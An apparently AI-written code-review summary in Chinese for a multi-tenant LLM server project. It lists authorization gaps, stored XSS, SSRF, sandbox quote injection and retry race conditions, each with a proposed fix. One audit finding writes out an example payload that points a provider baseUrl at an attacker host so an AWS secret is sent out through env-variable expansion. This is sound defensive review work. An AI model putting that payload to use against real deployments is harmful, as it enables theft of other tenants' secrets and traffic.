# Tianshu 项目 Review — 汇总（2026-07-11）

4 个并行 review 子 agent（core+安全 / chat 管线 / channels+plugins+routes / web+sandbox）
+ 我的仓库健康度扫描。全仓 typecheck 通过；scratch 脚本已 gitignore；src 仅 4 处 TODO；
CI 在 main 上跑 build+test(Node 22)。分模块详报见 reviews/01-04。

整体印象：**架构清晰、类型完备、测试覆盖不错（65 个测试文件）、多租户设计有明确 ADR 契约。
主要问题集中在一处：最近加的 admin 路由（Models/MCP）缺授权，且它踩到了多租户隔离红线。**

---

## 🔴 BLOCKER（必须先修，3/4 reviewer 独立命中同一处）

### B1. admin 路由无授权 —— 任何已登录租户用户可改写「全局」配置
- 位置：`packages/server/src/boot/routes-core.ts` 的 `GET/PUT /api/admin/models/providers`（我近期加的），以及 `plugins-routes.ts` 的 `/api/mcp/servers*`。
- 问题：路由只检查 `req.ctx`（登录即可），**没有 admin 角色校验，也没租户隔离**。"admin" 只是 URL 前缀。
- 后果（踩多租户红线）：
  - 租户 A 的用户能改写**进程级全局** provider 目录 → 影响所有租户
  - 把某 provider 的 `baseUrl` 改成攻击者代理 → **所有租户的 LLM 流量（prompt/工具输出/带的 server 端 key）被转发窃取**
  - 删 provider = 对其它租户 DoS；改全局 defaultModel = 静默重定向所有租户
- 修：给 `/api/admin/**` 加 `requireHostAdmin` 中间件（独立于租户身份，如 JWT `admin:true` / env / allow-list，默认拒绝），且全局配置路由**不该挂在 tenant middleware 下**。角色系统落地前，至少限制为单一 owner 或多租户时 fail-closed。前端 AdminShell 也要 gate。

### B2. apiKey `${VAR}` 展开 = 秘密外泄原语
- 位置：`packages/server/src/core/llm.ts:130-176` `resolveApiKey` + `expandEnvPlaceholders`。
- 问题：`apiKey` 是租户可覆盖字段，支持 `${ENV_VAR}` 在请求时展开成 `process.env`。配合 B1，攻击者可写入 `{baseUrl:"https://attacker", apiKey:"${AWS_SECRET_ACCESS_KEY}"}`，任何选到该 model 的请求就把 env 秘密当 Authorization 发给攻击者。`baseUrl` 还没做 http(s)/allow-list 校验。
- 修：只展开 operator 允许前缀的 env（如 `TIANSHU_KEY_*`）或只对**全局配置来源**的 apiKey 展开（租户配置不展开）；baseUrl 加 allow-list。

### B3.（前端）Models 页 apiKey 掩码 sentinel 直接绑进 input.value —— 编辑会损坏 key
- 位置：`packages/web/src/components/admin/ModelsPage.tsx:27,431-437`（我写的）。
- 问题：服务端返回 `apiKey:"__stored__"`，前端把它直接塞进 `<input type=password value=...>`。不改就重存会回传 sentinel（**服务端我做了 substitute 保留，所以不会静默丢 key**——但如果点进去改一半会存成 `"__stored__xxx"`，且 UI 语义混乱）。
- 修：加载时把 sentinel 转成空值 + `hasApiKey=true`，永远别把 sentinel 绑进 value；加「清除 key」按钮。（这个我可以顺手修。）

---

## 🟠 HIGH（尽快）

- **H-web1 · Markdown 允许 `javascript:` URL → 存储型 XSS**：`packages/web/src/lib/markdown-components.tsx` 的 `urlTransform` 替换了默认实现，没过滤 `javascript:`/`data:`。LLM 输出不可信（prompt 注入/工具结果/MCP），点一下就在应用 origin 执行。修：allowlist scheme 或包回 `defaultUrlTransform`。
- **H-chat1 · retry 在多轮 agent 中途失败时静默 no-op**：`takeResumableUserPrompt` 把「有内容但 stopReason=error」之外的边界判断有漏洞，tool_result 之后的 LLM 失败会返回 null，客户端以为完成了。（chat 报告 #3）
- **H-chat2 · `retry` WS 不 await 前一个 runPrompt，和 `takeResumableUserPrompt` / leaf_id 竞态**（#2）。
- **H-chat3 · pre-content retry 向 harness 重复 push `start` 事件**（#1）。
- **H-chat4 · retry 丢掉原始消息的附件/图片**（retry wire 消息没带 attachments）（#4）。
- **H-chat5 · 用户每次 Stop（abort）都 spawn 一个 session-recovery agent** —— 噪音+浪费，可能已在产生垃圾 admin 记录（#5）。
- **H-ch1 · MCP server CRUD 接受任意 URL → SSRF**，任意租户用户可写（channels 报告 #2）。
- **H-ch2 · `broadcastToUser` 只按 userId、无租户隔离**（#3）；idle-runner 扫**所有租户 DB** 找 session（#4）。
- **H-web2 · task pool 里 `workdir` 单引号注入可绕过 sandbox 降权** + `pool.ts` sudoers 语法坏了与 microsandbox.ts 不一致（web 报告）。
- **H-web3 · `chat-store.ts` 每次模块 re-eval 重复注册 ws 监听** → 重复消息/副作用；防御性去重掩盖了真 bug。

---

## 🟡 MEDIUM（选摘，详见分报告）

- PUT providers 缺失的 provider 会被静默删除（core H1）；并发 PUT lost-update（M2）。
- DbPool LRU 可能关掉别处还在用的 DB 连接（core H3）。
- 中间件「fallback 到 default 租户」是 dev 行为但烤进了共享 handler（core H2）；WS upgrade 同样 fallback（channels #6）。
- `config.ts`/`paths.ts` 多处不校验 tenantId（core H4）；cookie 解析接受 `.`/`..`（core M1）。
- `retryCompletion`（compact 路径）忽略 AbortSignal 且把用户 abort 误判为可重试（chat #6）。
- 插件 secret 拆分 `splitSecrets` 漏掉数组/深层嵌套里的 secret（channels #10）。
- MCP `url`/`upstreamHost` 接受 `javascript:`/`data:`、未校验（web）。
- retry 无 maxAttempts/maxDelayMs 上界（core M6）。

---

## ✅ 做得好的地方
- 多租户物理隔离（每租户独立 DB/目录）设计明确、ADR 有据。
- 类型完备、全仓 typecheck 干净、测试文件多。
- 最近的重试韧性链路（0.4.72-0.4.84）逻辑经浏览器实测；model-retry 分层清晰。
- 配置原子写（tmp+rename）、apiKey 对浏览器掩码的**意图**正确（只是前端绑定实现有 B3 bug）。
- 仓库卫生好：scratch 脚本 gitignore、CI 齐全、极少 TODO。

---

## 🎯 建议的修复优先级（前 5）
1. **B1 给 admin 路由加授权 + 把全局配置路由移出 tenant middleware**（我最近的活儿捅的娄子，最该先修）。
2. **B2 限制 apiKey `${VAR}` 展开范围 + baseUrl allow-list**（秘密外泄）。
3. **H-web1 Markdown `javascript:` XSS 过滤**（最大 XSS 面）。
4. **B3 Models 页 apiKey sentinel 前端绑定修正 + 清除按钮**（我能顺手修）。
5. **H-chat 一组 retry 竞态/静默丢失**（batch 修：#1/#2/#3/#4）。
